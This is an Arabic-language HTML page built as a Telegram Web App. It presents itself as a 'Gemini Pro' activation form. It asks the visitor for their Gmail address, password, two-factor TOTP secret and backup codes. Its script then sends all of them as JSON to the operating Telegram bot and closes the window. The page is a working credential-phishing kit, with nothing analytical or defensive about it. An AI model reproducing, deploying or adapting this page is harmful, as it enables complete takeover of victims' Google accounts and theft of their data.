<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل Gemini Pro</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #f0f2f5; font-family: Tahoma, Arial, sans-serif; margin: 0; padding: 0; }
        .header { background-color: #00a669; padding: 15px; color: white; font-size: 18px; font-weight: bold; }
        .container { padding: 15px; }
        .card { background-color: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .card-title { color: #00a669; font-weight: bold; margin-bottom: 15px; font-size: 14px; display: flex; align-items: center; gap: 8px; }
        label { display: block; font-size: 12px; font-weight: bold; margin-bottom: 5px; color: #333; }
        input, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; background-color: #f9f9f9; box-sizing: border-box; font-size: 14px; margin-bottom: 5px; }
        input:focus, textarea:focus { outline: none; border-color: #00a669; }
        .hint { font-size: 11px; color: #888; margin-bottom: 15px; display: block; }
        .badge { background-color: #eee; color: #666; font-size: 10px; padding: 2px 6px; border-radius: 10px; margin-right: auto; }
        .submit-btn { width: 100%; background-color: #00a669; color: white; padding: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; }
    </style>
</head>
<body>
    <div class="header">Gemini Pro Auto...</div>
    <div class="container">
        <form id="geminiForm">
            <div class="card">
                <div class="card-title">👤 حساب جوجل</div>
                <label>عنوان Gmail</label>
                <input type="email" id="email" placeholder="example@gmail.com" required>
            </div>
            
            <div class="card">
                <div class="card-title">🔑 كلمة مرور جيميل</div>
                <label>أدخل كلمة مرور Gmail الخاصة بك</label>
                <input type="password" id="password" required>
            </div>

            <div class="card">
                <div class="card-title">🔒 المصادقة الثنائية</div>
                <label>سر المصادقة الثنائية (TOTP)</label>
                <input type="text" id="totp" placeholder="على سبيل المثال: JBSWY3DPEHPK3PXP">
                <span class="hint">المفتاح السري من Google Authenticator: 32 حرفاً Base32 (والأرقام من 2 إلى 7 والأحرف من A إلى Z بالضبط).</span>
            </div>

            <div class="card">
                <div class="card-title" style="color: #666;">📝 رموز النسخ الاحتياطي <span class="badge">خيار</span></div>
                <textarea id="backup" rows="3" placeholder="سطر واحد من التعليمات البرمجية في كل سطر..."></textarea>
                <span class="hint">رمز واحد في كل سطر. 2-3 رموز مطلوبة؛ يتكون كل رمز من 8 أرقام بالضبط.</span>
            </div>

            <button type="submit" class="submit-btn">⚡ تأكيد وتفعيل</button>
        </form>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        document.getElementById('geminiForm').addEventListener('submit', function(e) {
            e.preventDefault();
            let data = {
                service: "gemini",
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                totp: document.getElementById('totp').value,
                backup: document.getElementById('backup').value
            };
            tg.sendData(JSON.stringify(data));
            tg.close();
        });
    </script>
</body>
</html>
